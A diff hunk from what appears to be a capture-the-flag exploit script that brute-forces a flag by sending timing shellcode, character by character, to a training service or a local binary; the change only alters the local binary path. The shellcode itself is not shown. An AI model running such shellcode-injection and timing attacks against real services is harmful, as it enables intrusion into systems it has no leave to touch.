@@ -62,7 +62,7 @@ def brute_force_flag():
                     p = remote("benchmarking-service.training.offensivedefensive.it", 8080, ssl=True)
                 else:
                     # Test locally with the actual binary
-                    p = process(["/challenge/benchmarking_service"])  # Adjust path as needed
+                    p = process(["./benchmarking_service"])  # Adjust path as needed
                 
                 # Send shellcode directly to the binary
                 shellcode = create_timing_shellcode(position, ord(char))
